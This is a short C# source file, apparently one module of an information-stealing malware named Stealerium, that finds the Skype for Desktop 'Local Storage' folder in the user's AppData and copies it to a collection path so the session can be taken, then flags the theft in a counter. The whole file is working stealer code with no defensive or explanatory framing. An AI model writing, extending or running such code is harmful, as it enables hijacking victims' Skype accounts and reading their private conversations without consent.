using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers
{
    internal sealed class Skype
    {
        private static readonly string SkypePath = Path.Combine(Paths.Appdata, "Microsoft\\Skype for Desktop");

        // Copy Local State directory
        public static void GetSession(string sSavePath)
        {
            if (!Directory.Exists(SkypePath))
                return;

            var localStorage = Path.Combine(SkypePath, "Local Storage");
            if (Directory.Exists(localStorage))
                try
                {
                    Filemanager.CopyDirectory(localStorage, sSavePath + "\\Local Storage");
                }
                catch
                {
                    return;
                }

            Counter.Skype = true;
        }
    }
}